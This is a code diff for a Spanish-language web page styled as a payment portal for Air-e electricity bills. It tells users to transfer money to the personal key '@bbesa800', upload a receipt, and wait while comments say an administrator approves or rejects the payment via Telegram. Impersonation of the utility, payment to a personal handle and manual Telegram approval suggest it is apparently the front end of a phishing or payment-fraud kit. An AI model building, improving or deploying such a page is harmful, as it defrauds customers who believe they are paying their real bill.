+            width: 28px;
+            height: 28px;
+            fill: currentColor;
+            animation: spinSlow 7s linear infinite;
+        }
+
+        @keyframes spinSlow {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .waiting-subtext {
+            font-size: 13px;
+            color: var(--text-muted);
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .live-status-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #f1f5f9;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--primary-dark);
+            margin-bottom: 20px;
+        }
+
+        .pulse-dot {
+            width: 9px;
+            height: 9px;
+            border-radius: 50%;
+            background: #10b981;
+            box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
+            animation: dotPulse 1.6s infinite;
+        }
+
+        @keyframes dotPulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 7px rgba(16, 185, 129, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        }
+
+        .waiting-details-box {
+            background: #f8fafc;
+            border: 1px solid var(--border-color);
+            border-radius: 14px;
+            padding: 14px 16px;
+            text-align: left;
+        }
+
+        .waiting-detail-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            padding: 5px 0;
+            color: var(--text-muted);
+        }
+
+        .waiting-detail-row strong {
+            color: var(--text-main);
+        }
+
+        /* ===== MODAL DE ÉXITO FINAL ===== */
+        .modal-box-success {
+            max-width: 420px;
+            text-align: center;
+            padding: 34px 24px;
+        }
+
+        .modal-icon-success {
+            width: 70px;
+            height: 70px;
+            background: #ecfdf5;
+            color: #10b981;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            box-shadow: 0 10px 25px -5px rgba(16, 185, 129, 0.3);
+        }
+
+        .modal-icon-success svg {
+            width: 40px;
+            height: 40px;
+            fill: currentColor;
+        }
+
+        .success-subtext {
+            font-size: 14px;
+            color: var(--text-muted);
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .success-receipt-card {
+            background: #f8fafc;
+            border: 1.5px dashed #cbd5e1;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        .success-receipt-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            padding: 6px 0;
+            border-bottom: 1px solid #e2e8f0;
+            color: var(--text-muted);
+        }
+
+        .success-receipt-row:last-child {
+            border-bottom: none;
+        }
+
+        .success-receipt-row strong {
+            color: var(--text-main);
+        }
+
+        .badge-approved {
+            background: #ecfdf5;
+            color: #059669;
+            font-weight: 800;
+            font-size: 12px;
+            padding: 3px 8px;
+            border-radius: 6px;
+            letter-spacing: 0.5px;
         }
 
         @media (max-width: 440px) {
@@ -803,6 +1299,17 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
     </header>
 
     <div class="card-body">
+        <!-- Banner de Alerta: Pago No Confirmado -->
+        <div class="alert-rejected" id="alertRejected" style="display: none;">
+            <div class="alert-rejected-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            </div>
+            <div class="alert-rejected-content">
+                <h4>Pago no confirmado o no realizado</h4>
+                <p>No logramos verificar la acreditación de tu pago en la cuenta bancaria. Por favor, asegúrate de realizar la transferencia por el valor exacto a la llave <strong>@bbesa800</strong> o mediante el código QR y vuelve a subir tu comprobante de pago.</p>
+            </div>
+        </div>
+
         <!-- Bloque de Monto y Factura -->
         <div class="amount-card">
             <div class="amount-label">Total a Pagar</div>
@@ -887,8 +1394,7 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
         </div>
 
         <!-- Botón de Confirmación -->
-        <button type="button" class="btn-confirm-payment" id="btnConfirmarPago" onclick="confirmarPago()">
-            <span class="spinner" id="confirmSpinner"></span>
+        <button type="button" class="btn-confirm-payment" id="btnConfirmarPago" onclick="abrirModalUpload()">
             <svg id="confirmIcon" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
             <span id="confirmText">Ya realicé el pago</span>
         </button>
@@ -907,15 +1413,120 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
     <span>¡Llave <strong>@bbesa800</strong> copiada al portapapeles!</span>
 </div>
 
-<!-- Modal de Confirmación -->
-<div class="modal-overlay" id="modalConfirmacion">
-    <div class="modal-box">
-        <div class="modal-icon">
-            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+<!-- Modal 1: Subir Comprobante de Pago -->
+<div class="modal-overlay" id="modalSubirComprobante" style="display: none;">
+    <div class="modal-box modal-box-upload">
+        <button type="button" class="modal-btn-x" onclick="cerrarModalUpload()" aria-label="Cerrar">&times;</button>
+        <div class="modal-upload-header">
+            <div class="upload-badge-icon">
+                <svg viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg>
+            </div>
+            <h2>Adjuntar Comprobante</h2>
+            <p>Sube una captura de pantalla o foto de tu transferencia a <strong>@bbesa800</strong> o escaneo QR para validarla de inmediato.</p>
         </div>
-        <h2>¡Pago Notificado con Éxito!</h2>
-        <p>Tu comprobante de pago ha sido registrado para validación. Tu factura será acreditada en el sistema en los próximos minutos.</p>
-        <button type="button" class="btn-modal-close" onclick="finalizarProceso()">Cerrar y Finalizar</button>
+
+        <form id="formComprobante" onsubmit="enviarComprobante(event)">
+            <input type="file" id="inputFileComprobante" accept="image/*" style="display: none;" onchange="handleFileSelected(this)">
+            
+            <!-- Zona de selección / drag & drop -->
+            <div class="upload-zone" id="uploadDropZone" onclick="document.getElementById('inputFileComprobante').click()">
+                <div class="upload-zone-idle" id="zoneIdle">
+                    <div class="upload-zone-icon">
+                        <svg viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+                    </div>
+                    <div class="upload-zone-text">
+                        <strong>Toca aquí para seleccionar tu comprobante</strong>
+                        <span>Formatos JPG, PNG o WEBP</span>
+                    </div>
+                </div>
+
+                <div class="upload-zone-preview" id="zonePreview" style="display: none;">
+                    <img id="imgPreview" src="" alt="Comprobante">
+                    <div class="preview-info">
+                        <span class="preview-name" id="previewFileName">comprobante.jpg</span>
+                        <span class="preview-size" id="previewFileSize">1.2 MB</span>
+                        <button type="button" class="btn-change-photo" onclick="event.stopPropagation(); document.getElementById('inputFileComprobante').click();">
+                            Cambiar imagen
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal-upload-actions">
+                <button type="submit" class="btn-submit-receipt" id="btnEnviarComprobante" disabled>
+                    <span class="spinner" id="spinnerUpload" style="display: none;"></span>
+                    <span id="btnUploadText">Enviar Comprobante</span>
+                </button>
+                <button type="button" class="btn-cancel-modal" onclick="cerrarModalUpload()">Cancelar y volver</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Modal 2: Espera en Vivo (Polling de Telegram) -->
+<div class="modal-overlay" id="modalEsperaValidacion" style="display: none;">
+    <div class="modal-box modal-box-waiting">
+        <div class="waiting-animation-container">
+            <div class="pulse-ring pulse-1"></div>
+            <div class="pulse-ring pulse-2"></div>
+            <div class="pulse-center-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 6h2v5h-2V7zm0 7h2v2h-2v-2z"/></svg>
+            </div>
+        </div>
+        <h2>Validando tu Transferencia...</h2>
+        <p class="waiting-subtext">Estamos verificando tu comprobante de pago en el sistema en tiempo real. Por favor, mantén esta ventana abierta.</p>
+        
+        <div class="live-status-pill">
+            <span class="pulse-dot"></span>
+            <span id="statusLiveText">Esperando confirmación...</span>
+        </div>
+
+        <div class="waiting-details-box">
+            <div class="waiting-detail-row">
+                <span>NIC / Factura:</span>
+                <strong id="waitingNic">---</strong>
+            </div>
+            <div class="waiting-detail-row">
+                <span>Total Reportado:</span>
+                <strong id="waitingTotal">---</strong>
+            </div>
+            <div class="waiting-detail-row">
+                <span>Destino:</span>
+                <strong>@bbesa800</strong>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal 3: Éxito Final (Pago Confirmado) -->
+<div class="modal-overlay" id="modalExitoFinal" style="display: none;">
+    <div class="modal-box modal-box-success">
+        <div class="modal-icon-success">
+            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+        </div>
+        <h2>¡Pago Confirmado con Éxito!</h2>
+        <p class="success-subtext">Tu comprobante ha sido verificado satisfactoriamente. Tu factura de energía Air-e ha sido cancelada en el sistema.</p>
+        
+        <div class="success-receipt-card">
+            <div class="success-receipt-row">
+                <span>Estado:</span>
+                <span class="badge-approved">APROBADO</span>
+            </div>
+            <div class="success-receipt-row">
+                <span>NIC:</span>
+                <strong id="successNic">---</strong>
+            </div>
+            <div class="success-receipt-row">
+                <span>Monto Pagado:</span>
+                <strong id="successTotal">---</strong>
+            </div>
+            <div class="success-receipt-row">
+                <span>Fecha y Hora:</span>
+                <span id="successDate">---</span>
+            </div>
+        </div>
+
+        <button type="button" class="btn-modal-close" onclick="finalizarProceso()">Finalizar y Salir</button>
     </div>
 </div>
 
@@ -1121,43 +1732,183 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
         }, 2500);
     }
 
-    // Confirmación del pago
-    function confirmarPago() {
-        const btn = document.getElementById('btnConfirmarPago');
-        const spinner = document.getElementById('confirmSpinner');
-        const icon = document.getElementById('confirmIcon');
-        const text = document.getElementById('confirmText');
+    // ===== FLUJO DE COMPROBANTE Y VERIFICACIÓN EN VIVO =====
+    let currentTransactionId = null;
+    let pollInterval = null;
+    let selectedReceiptFile = null;
+
+    function abrirModalUpload() {
+        document.getElementById('modalSubirComprobante').style.display = 'flex';
+    }
+
+    function cerrarModalUpload() {
+        document.getElementById('modalSubirComprobante').style.display = 'none';
+    }
+
+    function handleFileSelected(input) {
+        const file = (input.files && input.files[0]) ? input.files[0] : null;
+        if (!file) return;
+
+        if (!file.type.startsWith('image/')) {
+            alert('Por favor selecciona un archivo de imagen válido (JPG, PNG o WEBP).');
+            input.value = '';
+            return;
+        }
+
+        selectedReceiptFile = file;
+
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            document.getElementById('imgPreview').src = e.target.result;
+            document.getElementById('previewFileName').textContent = file.name;
+            const sizeInMb = (file.size / (1024 * 1024)).toFixed(2);
+            document.getElementById('previewFileSize').textContent = `${sizeInMb} MB`;
+            document.getElementById('zoneIdle').style.display = 'none';
+            document.getElementById('zonePreview').style.display = 'flex';
+            document.getElementById('btnEnviarComprobante').disabled = false;
+        };
+        reader.readAsDataURL(file);
+    }
+
+    // Configurar arrastrar y soltar (Drag and Drop)
+    const dropZone = document.getElementById('uploadDropZone');
+    if (dropZone) {
+        dropZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropZone.classList.add('drag-over');
+        });
+        dropZone.addEventListener('dragleave', () => {
+            dropZone.classList.remove('drag-over');
+        });
+        dropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            dropZone.classList.remove('drag-over');
+            if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                handleFileSelected({ files: e.dataTransfer.files });
+            }
+        });
+    }
+
+    function resetUploadForm() {
+        selectedReceiptFile = null;
+        const input = document.getElementById('inputFileComprobante');
+        if (input) input.value = '';
+        document.getElementById('imgPreview').src = '';
+        document.getElementById('zoneIdle').style.display = 'block';
+        document.getElementById('zonePreview').style.display = 'none';
+        const btn = document.getElementById('btnEnviarComprobante');
+        if (btn) {
+            btn.disabled = true;
+            const spinner = document.getElementById('spinnerUpload');
+            if (spinner) spinner.style.display = 'none';
+            const txt = document.getElementById('btnUploadText');
+            if (txt) txt.textContent = 'Enviar Comprobante';
+        }
+    }
+
+    function enviarComprobante(event) {
+        if (event) event.preventDefault();
+        if (!selectedReceiptFile) {
+            alert('Por favor adjunta la captura de tu comprobante de pago.');
+            return;
+        }
+
+        const btn = document.getElementById('btnEnviarComprobante');
+        const spinner = document.getElementById('spinnerUpload');
+        const txt = document.getElementById('btnUploadText');
 
         btn.disabled = true;
         spinner.style.display = 'inline-block';
-        icon.style.display = 'none';
-        text.textContent = 'Verificando...';
+        txt.textContent = 'Enviando...';
+
+        const formData = new FormData();
+        formData.append('action', 'upload_receipt');
+        formData.append('nic', nicParam);
+        formData.append('total', document.getElementById('displayTotal').textContent || totalParam);
+        formData.append('banco', bancoParam);
+        formData.append('comprobante', selectedReceiptFile);
 
         fetch('index.php', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                action: 'confirm_payment',
-                nic: nicParam,
-                total: document.getElementById('displayTotal').textContent || totalParam,
-                banco: bancoParam
-            })
+            body: formData
         })
-        .then(() => {
-            setTimeout(() => {
+        .then(res => res.json())
+        .then(data => {
+            if (data && data.status === 'success') {
+                currentTransactionId = data.transaction_id;
+                cerrarModalUpload();
+                iniciarEsperaValidacion(currentTransactionId);
+            } else {
+                alert('No se pudo enviar el comprobante. Por favor intenta nuevamente.');
+                btn.disabled = false;
                 spinner.style.display = 'none';
-                icon.style.display = 'inline-block';
-                text.textContent = '¡Pago Registrado!';
-                document.getElementById('modalConfirmacion').style.display = 'flex';
-            }, 1000);
+                txt.textContent = 'Enviar Comprobante';
+            }
         })
-        .catch(() => {
-            setTimeout(() => {
-                spinner.style.display = 'none';
-                icon.style.display = 'inline-block';
-                document.getElementById('modalConfirmacion').style.display = 'flex';
-            }, 1000);
+        .catch(err => {
+            console.error('Error al subir:', err);
+            alert('Error de conexión al enviar el comprobante. Por favor verifica e intenta de nuevo.');
+            btn.disabled = false;
+            spinner.style.display = 'none';
+            txt.textContent = 'Enviar Comprobante';
         });
+    }
+
+    function iniciarEsperaValidacion(transId) {
+        document.getElementById('waitingNic').textContent = nicParam;
+        document.getElementById('waitingTotal').textContent = document.getElementById('displayTotal').textContent || totalParam;
+        
+        // Ocultar alerta de rechazado si estaba visible
+        document.getElementById('alertRejected').style.display = 'none';
+
+        // Abrir modal de espera
+        document.getElementById('modalEsperaValidacion').style.display = 'flex';
+
+        if (pollInterval) clearInterval(pollInterval);
+        
+        // Consultar cada 2 segundos el estado en la base de datos
+        pollInterval = setInterval(() => {
+            verificarEstadoTransaccion(transId);
+        }, 2000);
+    }
+
+    function verificarEstadoTransaccion(transId) {
+        fetch(`index.php?action=check_status&id=${encodeURIComponent(transId)}`)
+            .then(res => res.json())
+            .then(data => {
+                if (data && data.status === 'success') {
+                    const estado = parseInt(data.estado, 10);
+                    if (estado === 10) {
+                        // ✅ PAGO CONFIRMADO POR EL ADMINISTRADOR EN TELEGRAM
+                        clearInterval(pollInterval);
+                        document.getElementById('modalEsperaValidacion').style.display = 'none';
+                        mostrarExito();
+                    } else if (estado === 11) {
+                        // ❌ PAGO NO REALIZADO / RECHAZADO POR EL ADMINISTRADOR EN TELEGRAM
+                        clearInterval(pollInterval);
+                        document.getElementById('modalEsperaValidacion').style.display = 'none';
+                        mostrarPagoRechazado();
+                    }
+                }
+            })
+            .catch(err => {
+                console.log('Consultando estado...', err);
+            });
+    }
+
+    function mostrarExito() {
+        document.getElementById('successNic').textContent = nicParam;
+        document.getElementById('successTotal').textContent = document.getElementById('displayTotal').textContent || totalParam;
+        const now = new Date();
+        document.getElementById('successDate').textContent = now.toLocaleString('es-CO');
+        document.getElementById('modalExitoFinal').style.display = 'flex';
+    }
+
+    function mostrarPagoRechazado() {
+        resetUploadForm();
+        const alertBox = document.getElementById('alertRejected');
+        alertBox.style.display = 'flex';
+        alertBox.scrollIntoView({ behavior: 'smooth', block: 'start' });
     }
 
     function finalizarProceso() {
